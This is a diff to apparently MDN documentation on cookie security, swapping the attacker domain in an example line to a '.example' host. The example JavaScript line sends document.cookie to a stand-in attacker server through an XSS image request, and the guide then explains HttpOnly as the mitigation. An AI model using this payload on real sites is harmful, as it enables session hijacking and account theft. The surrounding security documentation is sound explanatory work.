@@ -290,7 +290,7 @@ Stealing a cookie from a web application leads to hijacking the authenticated us
 Common ways to steal cookies include using [social engineering](<https://en.wikipedia.org/wiki/Social_engineering_(security)>) or by exploiting a [cross-site scripting](/en-US/docs/Glossary/Cross-site_scripting) (XSS) vulnerability in the application -
 
 ```js
-new Image().src = `http://www.evil-domain.com/steal-cookie.php?cookie=${document.cookie}`;
+new Image().src = `http://www.evil-domain.example/steal-cookie.php?cookie=${document.cookie}`;
 ```
 
 The `HTTPOnly` cookie attribute can help to mitigate this attack by preventing access to cookie value through JavaScript.
